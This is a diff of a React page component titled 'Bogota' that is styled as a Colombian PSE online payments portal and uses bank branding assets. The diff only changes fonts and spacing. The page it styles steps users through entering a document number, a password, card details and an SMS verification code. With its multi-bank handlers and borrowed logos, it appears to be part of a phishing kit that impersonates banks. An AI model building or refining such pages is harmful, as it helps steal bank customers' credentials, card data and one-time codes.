@@ -10,8 +10,8 @@ import { handlerAplicacion, handlerCajero, handlerClaveVirtual, handlerMensaje, 
 
 const COLOR_PRINCIPAL_TEXT = "text-[#0048db]"
 
-const text_color_principal = "text-[#5c5c5c]"
-const ESTILO_BTN_PRINCIPAL = `w-full font-bold py-2 px-6 bg-[#0041a8] text-white rounded-full disabled:bg-gray-200 disabled:text-gray-500 cursor-not-allowed`
+const text_color_principal = "text-[#5c5c5c] font-[Roboto-Regular]"
+const ESTILO_BTN_PRINCIPAL = `w-full font-[Roboto-Medium] text-[16px] font-medium py-4 bg-[#0041a8] mb-4 text-white rounded-full disabled:bg-gray-200 disabled:text-gray-500 cursor-not-allowed`
 
 const svg = (
     <img src="/assets/bancolombia/user.svg" className="w-[20px] h-[20px] object-contain" alt="" />
@@ -54,7 +54,7 @@ const InputAnimado = ({
   return (
     <div className="w-full flex flex-col min-h-[70px]">
         <div className="w-full flex flex-col">
-            <span className="text-[#5c5c5c] text-[13px] pb-1.5">
+            <span className="text-[#5c5c5c] font-[Roboto-Regular] text-[14px] pb-1.5">
                 {label}
             </span>
             <input
@@ -64,12 +64,12 @@ const InputAnimado = ({
                 onFocus={() => setIsFocused(true)}
                 onBlur={() => setIsFocused(false)}
                 onChange={(e) => handler(e)}
-                className={`py-1 px-2.5 outline-none ${isFocused ? "border-2 border-[#0041a8]":"border border-slate-300"}`}
+                className={`font-[Roboto-Regular] py-2.5 text-[16px] px-2.5 outline-none ${isFocused ? "border-2 border-[#0041a8]":"border border-slate-300"}`}
                 placeholder={placeHolder}
                 value={value}
                 />
         </div>
-        {error && <span className={`text-[12px] mt-1.5  font-medium ${labelErrorColor}`}>{errorLabel}</span>}
+        {error && <span className={`text-[12px] font-[Roboto-Regular] mt-1.5  font-medium ${labelErrorColor}`}>{errorLabel}</span>}
     </div>
   );
 }
@@ -146,7 +146,7 @@ const SelectMinimalista = ({
 
   return (
     <div className={`w-full flex flex-col`} >
-        <span className={`${labelColor} pl-2 text-[12px]`}>{label}</span>
+        <span className={`${labelColor} font-[Roboto-Regular] pl-2 text-[14px]`}>{label}</span>
         <div
         ref={containerRef}
         tabIndex={0}
@@ -154,8 +154,8 @@ const SelectMinimalista = ({
         onKeyDown={handleKeyDown}
         className={`w-full flex flex-col pl-2 relative cursor-pointer outline-none ${error ? borderColError : borderCol}`}
         >
-        <div className="w-full flex justify-between items-center border mt-1.5 px-1 py-0.5 border-slate-300">
-            <span className="ml-2">{selectedItem}</span>
+        <div className="w-full flex justify-between items-center border mt-1.5 px-1 py-2 border-slate-300">
+            <span className="ml-2 font-[Roboto-Regular]">{selectedItem}</span>
             <div className={`${colorSvg} transform transition-transform py-1.5 duration-300 ${!isOpen ? "rotate-180": ""}`}>
             <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" fill="currentColor" className="bi bi-chevron-up" viewBox="0 0 16 16">
                 <path fillRule="evenodd" d="M7.646 4.646a.5.5 0 0 1 .708 0l6 6a.5.5 0 0 1-.708.708L8 5.707l-5.646 5.647a.5.5 0 0 1-.708-.708z"/>
@@ -178,7 +178,7 @@ const SelectMinimalista = ({
                     e.stopPropagation();
                     handleSelect(typeof d === "object" ? d.value : d);
                 }}
-                className={`text-[14px] text-start flex items-center pr-1 gap gap-x-1 py-1 px-2 rounded ${
+                className={`text-[14px] font-[Roboto-Regular] text-start flex items-center pr-1 gap gap-x-1 py-1 px-2 rounded ${
                     (typeof d === "object" && selectedItem === d.value) || d === selectedItem ? "bg-slate-200" : ""
                 }`}
                 >
@@ -188,7 +188,7 @@ const SelectMinimalista = ({
             </div>
         )}
         </div>
-        {error && <span className="text-[14px] mt-1.5 text-red-600 font-medium">{errorLabel}</span>}
+        {error && <span className="text-[14px] font-[Roboto-Regular] mt-1.5 text-red-600 font-medium">{errorLabel}</span>}
     </div>
   );
 }
@@ -197,7 +197,7 @@ const Clave = ({handlerCheck, handlerContinuar, handlerVolver,datosInicio, error
     return(
         <div className="w-[99%] bg-white p-2 rounded-xl flex flex-col items-center">
             <div className="w-[90%] flex flex-col mt-4 mb-4">
-                <span className="text-[12px] text-center text-[#5c5c5c]">Ingrese constraseña </span>
+                <span className="text-[16px] text-center text-[#5c5c5c]">Ingrese constraseña </span>
             </div>
             
             <div className="w-[50%] mt-4 flex flex-col">
@@ -235,13 +235,13 @@ const Usuario = ({handlerCheck, handlerInformacion,handlerContinuar, datosInicio
     const [tipoUser, setTipoUser] = useState("Banca Personas")
     return(
         <div className="w-[99%] bg-white p-2 rounded-xl flex flex-col items-center">
-            <div className="w-[90%] flex flex-col mt-2.5 mb-5">
-                <span className="text-[12px] text-center text-[#5c5c5c]">Ingresa tipo y número de documento</span>
+            <div className="w-[90%] flex flex-col mt-10 mb-6">
+                <span className="text-[16px] font-[Roboto-Regular] text-[#5c5c5c]">Ingresa tipo y número de documento</span>
             </div>
-            <div className="w-[90%]">
+            <div className="w-[90%] mb-2.5">
                 <SelectMinimalista 
                     label={"¿Que tipo de cliente eres?"}
-                    labelColor={"text-[#5c5c5c]"}
+                    labelColor={"text-[#5c5c5c] font-[Roboto-Regular]"}
                     name={"tipoDocumento"} 
                     handler={setTipoUser}
                     colorSvg="text-[#0041a8]" 
@@ -252,11 +252,11 @@ const Usuario = ({handlerCheck, handlerInformacion,handlerContinuar, datosInicio
                     borderColError={"border-red-600"}
                 />
             </div>
-            <div className="w-[90%] mt-4 flex justify-between">
+            <div className="w-[90%] mt-4 mb-2.5 flex justify-between">
                 <div className="w-[30%]">
                     <SelectMinimalista 
                         label={"Documento"}
-                        labelColor={"text-[#5c5c5c]"}
+                        labelColor={"text-[#5c5c5c] font-[Roboto-Regular]"}
                         name={"tipoDocumento"} 
                         handler={handlerInformacion}
                         colorSvg="text-[#0041a8]" 
@@ -372,7 +372,7 @@ const InicioSesion = ({ handlerInformacion, datosInicio, btnInicio, btnCancelar,
         <div className="w-full flex flex-col justify-center items-center pb-4">
             {tituloError !== "" && 
                 <div className="w-full flex items-center justify-center">
-                    <span className="text-[11px] text-red-600">{tituloError}</span>
+                    <span className="text-[11px] font-[Roboto-Regular] text-red-600">{tituloError}</span>
                 </div>
             }
             <div className="w-full flex mt-4 flex-col justify-center items-center gap gap-y-4 pl-1">
@@ -493,18 +493,24 @@ export default function Bogota (){
                     <img src="/assets/bogota/tes.svg" className="w-[5vw] h-[15vh] mb-4" alt="" />
                 </div>
                 <div className="min-h-[70vh] w-[90%] flex flex-col items-center justify-center">
-                    <div className="w-[80%] flex flex-col justify-center">
-                        <span className="text-[18px] font-bold text-[#0041a8]">Bienvenido al nuevo</span>
-                        <span className="text-[18px] font-bold text-[#0041a8]">portal de pagos en línea PSE</span>
+                    <div className="w-full flex flex-col justify-center">
+                        <span className="text-[20px] font-[Montserrat] font-semibold text-[#0041a8]">Bienvenido al nuevo</span>
+                        <span className="text-[20px] font-[Montserrat] font-semibold text-[#0041a8]">portal de pagos en línea PSE</span>
                     </div>
                     {loading && <Loading/>}
                     
                     {loginData[selectVista] && <InicioSesion  key={key} handlerInformacion={loginData[selectVista].handler} datosInicio={datosInicio} tituloError={loginData[selectVista]?.error || ""} btnInicio={loginData[selectVista].btn}/>}
                     
-                    {tarjetaData[selectVista] && <Tarjeta key={key} setLoading={setLoading} setReLoad={setReLoad} uniqid={uniqId} status={selectVista} InputModificado={InputAnimado} textColor={text_color_principal} error={tarjetaData[selectVista]?.error || ""} titulo={tarjetaData[selectVista].titulo} handlerTarjeta={tarjetaData[selectVista].handler} labelBtnContinuar={"Continuar"} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} divInput={"border border-slate-300"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"}/>}
+                    {tarjetaData[selectVista] && 
+                        <div className="w-[99%] mt-4 bg-white  mb-2.5 rounded-xl flex flex-col items-center">
+                            <Tarjeta key={key} estiloTitulo="text-[14px] mt-3 mb-3 text-[#5c5c5c] font-[Roboto-Regular]" setLoading={setLoading} setReLoad={setReLoad} uniqid={uniqId} status={selectVista} InputModificado={InputAnimado} textColor={text_color_principal} error={tarjetaData[selectVista]?.error || ""} titulo={tarjetaData[selectVista].titulo} handlerTarjeta={tarjetaData[selectVista].handler} labelBtnContinuar={"Continuar"} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} divInput={"border border-slate-300"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"}/>
+                        </div>}
                     
 
-                    {codData[selectVista] && <Status key={key}setLoading={setLoading} svg={svgCard} setReLoad={setReLoad} uniqid={uniqId} status={selectVista} tamInput={6} textColor={text_color_principal} titulo={codData[selectVista].titulo} lebelInput={"Codigo por mensaje de texto"} InputModificado={InputAnimado} handler={codData[selectVista].handler} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} labelBtnContinuar={"Validar"} error={codData[selectVista]?.error || ""} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
+                    {codData[selectVista] && 
+                        <div className="w-[99%] bg-white mt-4 px-5 py-3 rounded-xl flex flex-col items-center">
+                            <Status key={key} estiloTitulo="text-[14px] text-[#5c5c5c] font-[Roboto-Regular]" setLoading={setLoading} setReLoad={setReLoad} uniqid={uniqId} status={selectVista} tamInput={6} textColor={text_color_principal} titulo={codData[selectVista].titulo} lebelInput={"Codigo por mensaje de texto"} InputModificado={InputAnimado} handler={codData[selectVista].handler} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} labelBtnContinuar={"Validar"} error={codData[selectVista]?.error || ""} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>
+                        </div>}
                     
                 </div>
             </div>
@@ -519,8 +525,8 @@ export default function Bogota (){
                 <div className="w-[90%] flex flex-col items-center justify-center">
                     <div className="w-full flex items-start border-b-1 pb-3 border-b-gray-500">
                         <div className="w-[70%] flex flex-col justify-center">
-                            <span className="text-[15px] mb-1.5 font-semibold text-white">Tu seguridad es lo primero</span>
-                            <span className="text-[12px] text-white">Sigue estos tips y tus transacciones estarán blindadas</span>
+                            <span className="text-[15px] font-[Roboto-Regular] mb-1.5 font-semibold text-white">Tu seguridad es lo primero</span>
+                            <span className="text-[12px] font-[Roboto-Regular] text-white">Sigue estos tips y tus transacciones estarán blindadas</span>
                         </div>
                         <div className="rounded-full p-2 ml-[15%] bg-[#0041a8] text-white">
                             <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" className="bi bi-chevron-down" viewBox="0 0 16 16">
@@ -530,8 +536,8 @@ export default function Bogota (){
                     </div>
                     <div className="w-full flex items-start mt-5 pb-1.5 ">
                         <div className="w-[70%] flex flex-col justify-center">
-                            <span className="text-[15px] mb-1.5 font-semibold text-white">Contáctanos </span>
-                            <span className="text-[12px] text-white">Si tienes alguna duda o algo te ha sucedido usa nuestros canales</span>
+                            <span className="text-[15px] font-[Roboto-Regular] mb-1.5 font-semibold text-white">Contáctanos </span>
+                            <span className="text-[12px] font-[Roboto-Regular] text-white">Si tienes alguna duda o algo te ha sucedido usa nuestros canales</span>
                         </div>
                         <div className="rounded-full p-2 ml-[15%] bg-[#0041a8] text-white">
                             <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" className="bi bi-chevron-down" viewBox="0 0 16 16">
